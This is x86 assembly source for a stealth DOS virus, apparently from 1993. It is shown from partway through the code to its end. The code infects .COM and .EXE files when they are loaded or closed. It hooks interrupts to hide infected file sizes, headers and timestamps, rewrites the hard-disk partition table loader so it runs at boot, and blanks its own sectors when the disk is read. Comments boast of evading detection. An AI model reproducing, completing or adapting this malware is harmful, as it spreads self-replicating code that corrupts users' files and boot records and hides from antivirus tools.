	push    ds      							;save DS on stack
	pop     es      							;restore ES from stack
	push    ax      							;save AX on stack
	call    get_suffix      						;get file suffix
	pop     ax      							;restore AX from stack
	cmp     ah,4bh  							;check requested operation
	jnz     skip_flag       						;branch if not load
	and     byte ptr cs:[toggle_byte],0ffh-suffix_flag      		;remove suffix flag from toggle

skip_flag:
	push    offset attrib_cont-begin					;save offset on stack
										;(simulate subroutine call)
hook_24h:
	pop     si      							;restore offset of calling routine from stack
	push    0       							;save 0 on stack
	pop     ds      							;set DS to 0
	mov     di,90h  							;offset of interrupt 24h in interrupt table
	cli     								;disable interrupts
	push    word ptr ds:[di]						;save old offset on stack
	push    word ptr ds:[di+2]      					;save old segment on stack
	mov     word ptr ds:[di],offset new_24h-begin   			;overwrite old offset with new offset
	mov     word ptr ds:[di+2],cs   					;overwrite old code segment with new code segment
										;(hook interrupt 24h)
										;(critical error, eg. disk write-protected)
	sti     								;enable interrupts
	push    ds      							;save 0 on stack
	push    di      							;save low offset of interrupt 24h handler on stack
	jmp     si      							;return from subroutine

attrib_cont:
	push    es      							;save ES on stack
	pop     ds      							;restore DS from stack
	mov     ax,4300h
	call    call_21h							;retrieve file attributes
	mov     ax,4301h
	push    ds      							;save segment of pathname on stack
	push    ax      							;save AX on stack
	push    cx      							;save CX on stack
	push    dx      							;save DX on stack
	xor     cx,cx   							;set attributes to read/write
	call    call_21h							;set file attributes as read/write
	jb      bad_op  							;branch if error
	mov     ax,3d02h
	call    call_21h							;open file for read/write
	jb      bad_rd  							;branch if error
	xchg    bx,ax   							;save handle number
	call    check_seconds   						;check if file already infected
	jz      bad_rd  							;branch if file is already infected
	push    cx      							;save file time on stack
	push    dx      							;save file date on stack
	call    infect  							;infect file
	pop     dx      							;restore file date from stack
	pop     cx      							;restore file time from stack
	jb      bad_rd  							;branch if error
	mov     ax,5701h
	call    call_21h							;restore file date and time

bad_rd: mov     ah,3eh
	call    call_21h							;close file

bad_op: pop     dx      							;restore DX from stack
	pop     cx      							;restore CX from stack
	pop     ax      							;restore AX from stack
	pop     ds      							;restore segment of pathname from stack
	call    call_21h							;restore file attributes
	push    offset infect_cont-begin					;save offset on stack
										;(simulate subroutine call)
restore_24h:
	pop     si      							;restore offset of calling routine from stack
	pop     di      							;restore low offset of interupt 24h handler from stack
	pop     ds      							;set DS to 0
	cli     								;disable interrupts
	pop     word ptr ds:[di+2]      					;restore old code segment
	pop     word ptr ds:[di]						;restore old offset
										;(restore old interrupt 24h handler)
	sti     								;enable interrupts
	jmp     si      							;return from subroutine

infect_cont:
	popa    								;restore all registers from stack
	pop     es      							;restore ES from stack
	pop     ds      							;restore DS from stack
	ret     								;return from subroutine

new_24h:mov     al,3    							;abort on critical error (for interrupt 24h)
	iret    								;return from interrupt

infect: push    cs      							;save code segment on stack
	pop     ds      							;restore code segment from stack
	mov     ah,3fh
	mov     cx,18h  							;number of bytes in header
	mov     dx,header_buffer						;offset of original header
	call    call_21h							;read .EXE header
	xor     ax,cx   							;ensure all bytes read
	jnz     sml_file							;branch if error or file smaller than 18h bytes
	push    ds      							;save code segment on stack
	pop     es      							;restore code segment from stack
	mov     si,dx   							;save offset of filename
	mov     di,offset exe_buffer-begin      				;offset of area to store original header on stack
	cld     								;set index direction to forward
	repz    movsb   							;save copy of header for disinfection
	mov     di,dx   							;save offset of filename
	mov     ax,4d5ah							;set initial header ID to 'ZM'
	cmp     ax,word ptr ds:[di]     					;check contents of header
	xchg    ah,al   							;switch to 'MZ'
	jz      save_type       						;branch if header contains 'ZM'
	cmp     ax,word ptr ds:[di]     					;check if header contains 'MZ'

save_type:
	pushf   								;save file type on stack
	jnz     check_suffix    						;branch if not .EXE file
	mov     word ptr ds:[di],ax     					;save 'MZ' in header
	jmp     short find_eof  						;branch to get length of file

check_suffix:
	test    byte ptr ds:[toggle_byte],suffix_flag   			;check suffix flag
	jnz     not_exe 							;branch if neither .COM, nor .EXE

find_eof:
	mov     ax,4202h
	xor     cx,cx   							;set high file pointer position to 0
	cwd     								;set low file pointer position to 0
	call    call_21h							;set file pointer to end of file (retrieve file size)
	mov     word ptr ds:[di+18h],ax 					;save low file size
	mov     word ptr ds:[di+1ah],dx 					;save high file size
	popf    								;restore file type from stack
	pushf   								;save file type on stack
	jz      overlay_check   						;branch if .EXE file
	cmp     ax,com_byte_c+1 						;check size of .COM file + virus
	jnb     not_exe 							;branch if maximum .COM size exceeded
	mov     byte ptr ds:[di],0e9h   					;save initial jump in .COM file
	sub     ax,3    							;calculate offset of viral code in .COM file
	mov     word ptr ds:[di+1],ax   					;store offset of jump to viral code in .COM file
	jmp     short ok_com    						;branch to write viral code

not_exe:popf    								;restore flags from stack

sml_file:
	stc     								;specify error occurred
	ret     								;return from subroutine

overlay_check:
	cmp     word ptr ds:[di+0ch],cx 					;check location to load code segment
	jz      not_exe 							;branch if as high as possible in memory
										;(I cannot justify the code size increase to support this)
	mov     ax,word ptr ds:[di+4]   					;retrieve number of pages in .EXE file
	cmp     word ptr ds:[di+2],cx   					;check size of last page
	jz      sub_none							;branch if file is 512-byte aligned
	dec     ax      							;subtract 1

sub_none:
	mov     si,200h 							;number of bytes in a page
	mul     si      							;calculate number of bytes in .EXE file
	add     ax,word ptr ds:[di+2]   					;add number of bytes in last lage
	adc     dx,cx   							;calculate file size from header info
	cmp     dx,word ptr ds:[di+1ah] 					;ensure high file size in header is same as high file size
	jnz     not_exe 							;branch if file contains internal overlays
	cmp     ax,word ptr ds:[di+18h] 					;ensure low file size in header is same as low file size
	jnz     not_exe 							;branch if file contains internal overlays

ok_com: mov     ah,40h
	mov     cx,code_byte_c  						;number of bytes in viral code
	cwd     								;set address to 0
	call    call_21h							;write viral code
	xor     cx,ax   							;ensure all bytes were written
	jnz     not_exe 							;branch if error
	mov     ax,4200h
	call    call_21h							;set file pointer to start of file
	popf    								;restore file type from stack
	jnz     write_header    						;branch if file is .COM
	les     ax,dword ptr ds:[di+18h]					;retrieve low file size
	push    ax      							;save high file size on stack
	mov     dx,es   							;save low file size on stack
	mov     si,10h  							;number of bytes in a paragraph
	div     si      							;convert header size from paragraphs to bytes
	sub     ax,word ptr ds:[di+8]   					;subtract header size from new file size
	mov     word ptr ds:[di+14h],dx 					;save new initial instruction pointer
	mov     word ptr ds:[di+16h],ax 					;save new inital code segment
	add     dx,stack_byte_c 						;set stack pointer to end of viral code
	mov     word ptr ds:[di+0eh],ax 					;save new initial stack pointer
	mov     word ptr ds:[di+10h],dx 					;save new initial stack segment
	pop     ax      							;restore high file size from stack
	mov     dx,es   							;restore low file size from stack
	add     ax,code_byte_c  						;calculate new file size
	adc     dx,cx   							;allow for page shift
	mov     ch,2    							;number of bytes in a page
	div     cx      							;calculate new number of pages
	or      dx,dx   							;check size of last page
	jz      add_none							;branch if file is 512-byte aligned
	inc     ax      							;add 1

add_none:
	mov     word ptr ds:[di+2],dx   					;save number of bytes in last page
	mov     word ptr ds:[di+4],ax   					;add additional number of pages to file size in header

write_header:
	mov     ah,40h
	mov     cx,18h  							;number of bytes in header
	mov     dx,di   							;save address of header
	jmp     call_21h							;write new file header

do_close:
	cmp     byte ptr cs:[file_handle],bl    				;check which handle is terminating
										;if you require more than 255 handles, then you are greedy!
	jnz     close_file      						;branch if saved handle is not terminating
	mov     byte ptr cs:[file_handle],bh    				;specify file is not to be infected
										;this is safe, provided the handle number is less than 768  :)
	pusha   								;save all registers on stack
	mov     al,byte ptr cs:[toggle_byte]    				;get suffix type
	and     al,closef_flag  						;strip off all but close flag
	shr     al,1    							;convert to flag for suffix
	or      byte ptr cs:[toggle_byte],suffix_flag   			;store suffix flag in toggle
	xor     byte ptr cs:[toggle_byte],al    				;update suffix flag in toggle
	mov     bp,ds   							;save DS in BP
	call    hook_24h							;hook interrupt 24h
	push    es      							;save ES on stack
	mov     ax,4200h
	xor     cx,cx   							;set high file pointer position to 0
	cwd     								;set low file pointer position to 0
	call    call_21h							;set file pointer to start of file
	call    infect  							;infect file
	jb      ok_close							;branch if error
	mov     ax,5700h
	call    call_21h							;retrieve file date and time
	inc     al
	or      cl,1fh  							;set all seconds fields
	dec     cx      							;set 60 seconds
	call    call_21h							;set file date and time

ok_close:
	pop     es      							;restore ES from stack
	mov     ds,bp   							;restore DS from BP
	mov     ah,3eh
	call    call_21h							;close file
	call    restore_24h     						;restore interrupt 24h
	mov     ds,bp   							;restore DS from BP
	popa    								;restore all registers from stack
	retf    2       							;return from interrupt with flags set

close_file:
	jmp     jfar_21h							;close file
	db      "*4U2NV*"       						;that is, unless you're reading this...

check_disinf:
	cmp     al,2    							;check requestion operation
	jnz     close_file      						;branch if not set from end of file

do_disinf:
	push    ax      							;save AX on stack
	push    cx      							;save CX on stack
	push    dx      							;save DX on stack
	call    check_seconds   						;check if file already infected
	pop     dx      							;restore DX from stack
	pop     cx      							;restore CX from stack
	pop     ax      							;restore AX from stack
	jnz     close_file      						;branch if file is not infected
	push    si      							;save SI on stack
	push    ds      							;save segment of buffer on stack
	push    dx      							;save offset of buffer on stack
	push    cx      							;save bytes requested on stack
	push    ax      							;save operation on stack
	push    cs      							;save code segment on stack
	pop     ds      							;restore code segment from stack
	mov     si,header_buffer+18h    					;offset of scratch area
	mov     word ptr ds:[si],cx     					;save number of bytes requested
	xor     cx,cx   							;set number of header bytes committed to 0
	mov     word ptr ds:[si+2],cx   					;save header bytes count
	mov     ax,4201h
	cwd     								;set low file pointer position to 0
	call    call_21h							;calculate current file pointer position
	mov     word ptr ds:[si+4],ax   					;save low file pointer position
	mov     word ptr ds:[si+6],dx   					;save high file pointer position
	mov     ax,4202h
	cwd     								;set low file pointer position to 0
	call    call_21h							;set file pointer to end of file
	sub     ax,code_byte_c  						;calculate original file size
	sbb     dx,cx   							;allow for page shift
	mov     word ptr ds:[si+8],ax   					;save low file size
	mov     word ptr ds:[si+0ah],dx 					;save high file size
	pop     ax      							;restore AX from stack
	cmp     ah,42h  							;check which operation was requested
	jnz     read_or_write   						;branch if not set file pointer
	pop     cx      							;restore high file pointer position from stack
	pop     dx      							;restore low file pointer position from stack
	pop     ds      							;restore segment of buffer from stack
	pop     si      							;restore SI from stack
	push    cx      							;save high file pointer position on stack
	sub     dx,code_byte_c  						;remove viral code from file pointer position
	sbb     cx,0    							;allow for page shift
	call    call_21h							;proceed with set file pointer
	pop     cx      							;restore high file pointer position from stack
	retf    2       							;return from interrupt with flags set

go_restore:
	jmp     restore_file    						;branch to restore file

read_or_write:
	push    ax      							;save operation on stack
	mov     ax,4200h
	mov     dx,word ptr ds:[si+4]   					;retrieve low file pointer position
	mov     cx,word ptr ds:[si+6]   					;retrieve high file pointer position
	call    call_21h							;restore current file pointer position
	or      dx,dx   							;check area of operation
	jnz     not_header      						;branch if header not involved
	cmp     ax,18h  							;check area of operation
	jnb     not_header      						;branch if header not involved
	pop     ax      							;restore operation from stack
	pop     cx      							;restore byte count from stack
	push    cx      							;save byte count on stack
	push    ax      							;save operation on stack
	cmp     ah,3fh  							;check which operation was requested
	jnz     go_restore      						;branch if operation is not read

read_file:
	mov     ax,cx   							;set number of bytes requested
	add     cx,word ptr ds:[si+4]   					;check area of operation
	jb      header_plus     						;branch if header plus additional is involved
	cmp     cx,18h  							;check area of operation
	jb      read_header     						;branch if only header is involved

header_plus:
	mov     ax,18h  							;number of bytes in header
	sub     ax,word ptr ds:[si+4]   					;calculate number of bytes of header to read
	mov     word ptr ds:[si+2],ax   					;save number of bytes of header to read

read_header:
	sub     word ptr ds:[si],ax     					;subtract bytes committed from bytes requested
	push    ax      							;save byte count on stack
	mov     ax,4200h
	mov     cx,word ptr ds:[si+0ah] 					;retrieve high file size
	mov     dx,word ptr ds:[si+8]   					;retrieve low file size
	add     dx,offset exe_buffer-begin      				;point to original header in viral code
	adc     cx,0    							;allow for page shift
	call    call_21h							;set file pointer to original header
	pop     cx      							;restore byte count from stack
	push    bp      							;save BP on stack
	mov     bp,sp   							;point to current top of stack
	lds     dx,dword ptr ss:[bp+6]  					;retrieve original segment and offset of pathname
	pop     bp      							;restore BP from stack
	mov     ah,3fh
	call    call_21h							;read original header into destination area
	push    cs      							;save code segment on stack
	pop     ds      							;restore code segment from stack
	push    ax      							;save bytes read on stack
	push    cx      							;save bytes committed on stack
	add     word ptr ds:[si+4],ax   					;set low file pointer position including bytes committed
	adc     word ptr ds:[si+6],0    					;set high file pointer position including bytes committed
	mov     dx,word ptr ds:[si+4]   					;retrieve low file pointer position
	mov     cx,word ptr ds:[si+6]   					;retrieve high file pointer position
	mov     ax,4200h
	call    call_21h							;set file pointer to current position plus bytes committed
	pop     cx      							;restore bytes committed from stack
	pop     ax      							;restore bytes read from stack
	sub     cx,ax   							;ensure all bytes committed
	jnz     read_error      						;branch if error
	cmp     cx,word ptr ds:[si]     					;check if all bytes committed
	jnz     not_header      						;branch if more bytes requested
	pop     cx      							;discard 2 bytes from stack
	pop     cx      							;restore bytes committed from stack
	mov     ax,cx   							;set number of bytes committed
	jz      dis_return      						;branch if all bytes committed

read_error:
	pop     dx      							;discard 2 bytes from stack
	pop     dx      							;discard 2 bytes from stack

dis_return:
	pop     dx      							;restore offset of buffer from stack
	pop     ds      							;restore segment of buffer from stack
	pop     si      							;restore SI from stack
	retf    2       							;return from interrupt with flags set

not_header:
	pop     ax      							;restore operation from stack
	push    ax      							;save operation on stack
	mov     cx,word ptr ds:[si+4]   					;retrieve high file pointer position
	mov     dx,word ptr ds:[si+6]   					;retrieve low file pointer position
	cmp     dx,word ptr ds:[si+0ah] 					;check current file pointer position
	ja      is_eof  							;branch if outside original file size
	jb      not_eof 							;branch if within original file size
	cmp     cx,word ptr ds:[si+8]   					;check current file pointer position
	jbe     not_eof 							;branch if within original file size

is_eof: cmp     ah,40h  							;check which operation was requested
	jz      restore_file    						;branch if write
	pop     cx      							;discard 2 bytes from stack
	pop     cx      							;restore bytes requested from stack
	xor     ax,ax   							;set bytes committed to 0
	jmp     short dis_return						;return zero bytes committed if file size already exceeded

not_eof:add     cx,word ptr ds:[si]     					;set low destination file pointer position
	adc     dx,0    							;set high destination file pointer position
	cmp     dx,word ptr ds:[si+0ah] 					;check destination file pointer position
	ja      wb_eof  							;branch if outside original file size
	jb      within_file     						;branch if within original file size
	cmp     cx,word ptr ds:[si+8]   					;check destination file pointer position
	jbe     within_file     						;branch if within original file size

wb_eof: cmp     ah,40h  							;check which operation was requested
	jz      restore_file    						;branch if write
	mov     cx,word ptr ds:[si+8]   					;retrieve high file size
	mov     dx,word ptr ds:[si+0ah] 					;retrieve low file size
	sub     cx,word ptr [si+4]      					;calculate low number of bytes requested
	sbb     dx,word ptr [si+6]      					;calculate high number of bytes requested
	jz      save_count      						;branch if 64k boundary not exceeded
	mov     cx,0ffffh       						;if greater than page size, set read to 64k
	sub     cx,word ptr ds:[si+2]   					;minus the number of header bytes already read

save_count:
	mov     word ptr ds:[si],cx     					;save number of bytes requested

within_file:
	pop     ax      							;restore operation from stack
	pop     cx      							;restore bytes requested from stack
	pop     dx      							;restore offset of buffer from stack
	pop     ds      							;restore segment of buffer from stack
	push    cx      							;save bytes requested on stack
	push    ax      							;save operation on stack
	push    dx      							;save offset of buffer on stack
	mov     cx,word ptr cs:[si]     					;retrieve number of bytes requested
	add     dx,word ptr cs:[si+2]   					;set buffer to allow for bytes from header area
	call    call_21h							;operate on requested number of bytes minus header
	add     ax,word ptr cs:[si+2]   					;return count of actual requested number of bytes
	pop     dx      							;restore offset of buffer from stack
	pop     cx      							;restore bytes requested from stack
	cmp     ch,3fh  							;check which operation was requested
	jz      quit_read       						;branch if operation is read
	push    ax      							;save operation on stack
	push    dx      							;save DX on stack
	mov     ax,5700h
	call    call_21h							;retrieve file date and time
	inc     al
	or      cl,1fh  							;set all seconds fields
	dec     cx      							;set 60 seconds
	call    call_21h							;set file date and time
	pop     dx      							;restore DX from stack
	pop     ax      							;restore operation from stack

quit_read:
	pop     cx      							;restore bytes requested from stack
	pop     si      							;restore SI from stack
	retf    2       							;return from interrupt with flags set

restore_file:
	mov     ax,4200h
	mov     cx,word ptr ds:[si+0ah] 					;retrieve high file pointer position
	mov     dx,word ptr ds:[si+8]   					;retrieve low file pointer position
	add     dx,offset exe_buffer-begin      				;set low file pointer position to original header
	adc     cx,0    							;set high file pointer position to original header
	call    call_21h							;set file pointer to original header
	mov     ah,3fh
	mov     cx,18h  							;number of bytes in header
	mov     dx,header_buffer						;point to offset of header scratch area
	push    cx      							;save CX on stack
	push    dx      							;save DX on stack
	call    call_21h							;read original header into scratch area
	mov     ax,4200h
	mov     dx,word ptr ds:[si+8]   					;retrieve low file size
	mov     cx,word ptr ds:[si+0ah] 					;retrieve high file size
	call    call_21h							;set file pointer to original end of file
	mov     ah,40h
	xor     cx,cx   							;set number of bytes to write to 0
	call    call_21h							;truncate file to original length
	mov     ax,4200h
	xor     cx,cx   							;set high offset of file pointer to 0
	cwd     								;set low offset of file pointer to 0
	call    call_21h							;set file pointer to beginning of file
	mov     ah,40h
	pop     dx      							;restore DX from stack
	pop     cx      							;restore CX from stack
	call    call_21h							;restore original header to file
	mov     ax,4200h
	mov     dx,word ptr ds:[si+4]   					;retrieve low file pointer position
	mov     cx,word ptr ds:[si+6]   					;retrieve high file pointer position
	call    call_21h							;restore current file pointer position
	pop     ax      							;restore operation from stack
	pop     cx      							;restore bytes requested from stack
	pop     dx      							;restore offset of buffer from stack
	pop     ds      							;restore segment of buffer from stack
	pop     si      							;restore SI from stack
	jmp     jfar_21h							;branch to process original request

fix_time:
	push    ax      							;save AX on stack
	push    cx      							;save CX on stack
	push    dx      							;save DX on stack
	call    check_seconds   						;check if file already infected
	pop     dx      							;restore DX from stack
	pop     cx      							;restore CX from stack
	pop     ax      							;restore AX from stack
	jz      check_time      						;branch if file is infected
	jmp     jfar_21h							;proceed with time operation

check_time:
	or      al,al   							;check which operation was requested
	jnz     set_time							;branch if operation is set time
	call    call_21h							;retrieve time
	and     cl,0e0h 							;return 0 seconds if infected

quit_get:
	retf    2       							;return from interrupt with flags set

set_time:
	push    cx      							;save file time on stack
	or      cl,1fh  							;set all seconds fields
	dec     cx      							;set 60 seconds
	call    jfar_21h							;set time
	pop     cx      							;restore file time from stack
	retf    2       							;return from interrupt with flags set

new_12h:push    ds      							;save DS on stack
	push    0       							;save 0 on stack
	pop     ds      							;set DS to 0
	mov     ax,word ptr ds:[413h]   					;get current memory size
	pop     ds      							;restore DS from stack
	add     ax,kilo_count   						;restore top of system memory value
	iret    								;return from interrupt
	db      "26/02/93"      						;welcome to the future of viruses

new_2fh:cmp     ax,1607h							;virtual device call out api...
	jnz     jfar_2fh
	cmp     bx,10h  							;virtual hard disk device...
	jnz     jfar_2fh
	cmp     cx,3    							;installation check...
	jnz     jfar_2fh
	xor     cx,cx   							;prevents windows message
										;"cannot load 32-bit disk driver"
	iret    								;return from interrupt

jfar_2fh:
	db      0eah    							;far jump to original interrupt 2fh
	dd      0

exe_buffer:

if      stub_exe
	db      "MZ"
	dw      3
	dw      1
	dw      0
	dw      2
	dw      0
	dw      0ffffh
	dw      0fff0h
	dw      0fffeh
	db      "GM"
	dw      100h
	dw      0fff0h
else
	int     20h
	db      0
	db      15h dup (0)
endif

new_13h:push    ds      							;save DS on stack
	push    es      							;save ES on stack
	push    bx      							;save BX on stack
	xor     bx,bx   							;zero BX
	mov     ds,bx   							;set DS to 0
	mov     bh,0b8h 							;set default video type to colour
	cmp     byte ptr ds:[463h],0d4h 					;check video type
	jz      set_vid 							;branch if colour
	mov     bh,0b0h 							;set video type to mono

set_vid:mov     es,bx   							;set video memory segment
	mov     bx,word ptr ds:[4]      					;get offset of interrupt 1 handler
	push    word ptr es:[bx]						;save video segment:interrupt 1 handler offset
	mov     byte ptr es:[bx],0cfh   					;save IRET in video segment:interrupt 1 handler offset
	mov     word ptr ds:[6],es      					;set interrupt 1 handler segment to video segment
	push    ds      							;save 0 on stack
	popf    								;disable interrupt 1
	pop     word ptr es:[bx]						;restore video segment:interrupt 1 handler offset
	pop     bx      							;restore BX from stack
	pop     es      							;restore ES from stack
	pop     ds      							;restore DS from stack

;       	     all attempts at a tunneling technique
;       	       to locate the address of the BIOS
;       		will be terminated by this code

	cmp     ax,1d7h 							;check which operation was requested
	jnz     check_disk      						;branch if not call sign
	mov     ax,4d47h							;return sign
	iret    								;return from interrupt

check_disk:
	cmp     dx,80h  							;check which disk is being accessed
	jnz     jfar_13h							;branch if not hard disk
	cmp     cx,sec_count+1  						;check which sectors are being accessed
	ja      jfar_13h							;branch if not viral code sectors or partition table
	cmp     ah,3    							;check which operation was requested
	jz      ok_partition    						;branch if write
	cmp     ah,2    							;check which operation was requested
	jnz     jfar_13h							;branch if not read
	pusha   								;save all registers on stack
	push    ax      							;save AX on stack
	pushf   								;save flags on stack
	push    cs      							;save code segment on stack
	push    offset cont_13h-begin   					;save offset on stack
										;(simulate interrupt call)
jfar_13h:
	db      0eah    							;far jump to original interrupt 13h
	dd      0

cont_13h:
	pop     ax      							;restore AX from stack
	dec     cx      							;check which sectors are being accessed
	jnz     vir_sectors     						;branch if not accessing partition table
	mov     cl,offset phook_interrupts-newp_loader  			;number of bytes in new partition table loader
	mov     si,offset oldp_loader-begin     				;address of area containing original partition table code
	mov     di,bx   							;point to partition table
	db      2eh     							;CS:
	repz    movsb   							;restore original partition table code
	mov     cl,10h  							;number of bytes in active partition
	mov     di,word ptr cs:[si]     					;retrieve offset of partition information
	inc     si      							;skip 1 byte in source (must retain AX)
	inc     si      							;skip 1 byte in source (so cannot use LODSW)
	add     di,bx   							;allow for the code offset
	db      2eh     							;CS:
	repz    movsb   							;restore original partition information
	dec     al      							;reduce number of sectors by 1
	jz      quit_part       						;branch if only 1 sector requested
	add     bx,200h 							;skip partition table

vir_sectors:
	cmp     al,sec_count    						;check number of sectors being accessed
	jb      set_loop							;branch if fewer than viral sectors
	mov     al,sec_count    						;set sectors read to number of viral sectors

set_loop:
	cbw     								;only want the sector count
	mov     cx,200h 							;number of bytes in a sector
	mul     cx      							;calculate number of bytes in sectors to clear
	xchg    ax,cx   							;set store byte to 0
	mov     di,bx   							;point to offset of sectors to blank

clear_sectors:
	stosb   								;clear viral code sectors in memory
	loop    clear_sectors   						;(pretend sectors are blank)

quit_part:
	popa    								;restore all registers from stack

ok_partition:
	xor     ah,ah   							;return only sector count

int13h_ret:
	retf    2       							;return from interrupt with flags set

oldp_loader:
	db      24h dup (0)     						;area to contain old partition table loader

p_offset:
	dw      0       							;offset of active partition

part_buffer:
	db      10h dup (0)     						;area to contain old active partition
	db      0,0,1,0,5,0,0b8h,0bh,1,0,0,0,0bch,1,0,0 			;new active partition

newp_loader:
	xor     bx,bx   							;zero BX
	mov     ss,bx   							;set stack segment
	mov     sp,7c00h							;set stack pointer to bottom of partition table in memory
	sub     word ptr cs:[413h],kilo_count   				;reduce size of total system memory
	int     12h     							;allocate memory at top of system memory
	shl     ax,6    							;convert kilobyte count to memory segment
	mov     es,ax   							;retrieve segment of new top of system memory
	mov     ax,sec_count+200h       					;number of sectors in code
	mov     cx,2    							;cylinder 0, sector 2
	mov     dx,80h  							;of hard disk
	int     13h     							;read viral code sectors to top of system memory
	push    es      							;save top of system memory code segment on stack
	push    offset phook_interrupts-begin   				;save top of system memory offset on stack
										;(simulate far call)
	retf    								;return to phook_interrupts at top of system memory

phook_interrupts:
	mov     word ptr cs:[toggle_byte],bx    				;interrupt 21h not executing,
										;interrupt 12h not yet hooked
										;(incidently zeroes file handle)
	mov     word ptr cs:[process_no],bx     				;specify no programs currently executing
	mov     ds,bx   							;set DS to 0
	mov     si,20h  							;offset of interrupt 8 in interrupt table
	mov     di,offset jfar_21h-begin+1      				;offset of area to store old interrupt 8 handler address
	cld     								;set index direction to forward
	movsw   								;save old offset
	movsw   								;save old code segment
	mov     si,4ch  							;offset of interrupt 13h in interrupt table
	mov     di,offset jfar_13h-begin+1      				;offset of area to store old interrupt 13h handler address
	movsw   								;save old offset
	movsw   								;save old code segment
	cli     								;disable interrupts
	mov     word ptr ds:[si-30h],offset new_8-begin 			;overwrite old offset with new offset
	mov     word ptr ds:[si-2eh],cs 					;overwrite old code segment with new code segment
										;(hook interrupt 8)
	mov     word ptr ds:[si-4],offset new_13h-begin 			;overwrite old offset with new offset
	mov     word ptr ds:[si-2],cs   					;overwrite old code segment with new code segment
										;(hook interrupt 13h)
	sti     								;enable interrupts
	mov     word ptr ds:[si+36h],cs 					;destroy interrupt 21h until further notice
										;(when system file loads, the value here will be set)
	push    ds      							;save 0 on stack
	pop     es      							;set ES to 0
	mov     ax,201h 							;read 1 sector
	mov     bx,7c00h							;to offset 7c00h
	dec     cx      							;cylinder 0, sector 1
	pushf   								;save flags on stack
	push    es      							;save code segment on stack
	push    bx      							;save offset of boot sector on stack
										;(simulate far call)
	jmp     new_13h 							;proceed with boot

new_8:  call    call_21h							;simulate interrupt call
										;(currently contains address of original interrupt 8)
	cli     								;disable interrupts
	push    es      							;save ES on stack
	push    0       							;save 0 on stack
	pop     es      							;set ES to 0
	cmp     word ptr es:[86h],1000h 					;check owner of interrupt 21h
	jnb     exit_8  							;branch if system file has not loaded yet
	push    ds      							;save DS on stack
	push    si      							;save SI on stack
	push    di      							;save DI on stack
	mov     si,offset jfar_21h-begin+1      				;offset of address of old interrupt 8 handler
	mov     di,20h  							;offset of interrupt 8 in interrupt table
	cld     								;set index direction to forward
	db      2eh     							;CS:
	movsw   								;restore old offset
	db      2eh     							;CS:
	movsw   								;restore old code segment
										;(restore interrupt 8)
	mov     si,86h  							;code segment pointer to MSDOS.SYS (or equivalent)
	call    hook_int							;hook interrupt
	pop     di      							;restore DI from stack
	pop     si      							;restore SI from stack
	pop     ds      							;restore DS from stack

exit_8: pop     es      							;restore ES from stack
	sti     								;enable interrupts
	iret    								;return from interrupt

code_end:


;       			      DATA
;              used while resident, not present in infected files
;       		    current size = 62 bytes

old01_addr      equ     (offset $-offset begin+1) and 0fffeh
       ;dd      0       							;area to contain old interrupt 1 handler address

old03_addr      equ     old01_addr+4
       ;dd      0       							;area to contain old interrupt 3 handler address

old21h_code     equ     old03_addr+4
       ;db      0
       ;dd      0       							;area to contain original 5 bytes of interrupt handler

toggle_byte     equ     old21h_code+5
       ;db      0       							;toggle switch

file_handle     equ     toggle_byte+1
       ;db      0       							;area to contain handle number of file to infect on closed

header_buffer   equ     file_handle+1
       ;db      24h dup (0)     						;area to contain original file header during infection

process_no      equ     header_buffer+24h
       ;dw      0       							;area to contain number of currently executing process

proc_off	equ     process_no+2
       ;dw      0       							;area to contain offset of first process

proc_seg	equ     proc_off+2
       ;dw      0       							;area to contain segment of first process

total_end       equ     proc_seg+2

end     stub
</defjam>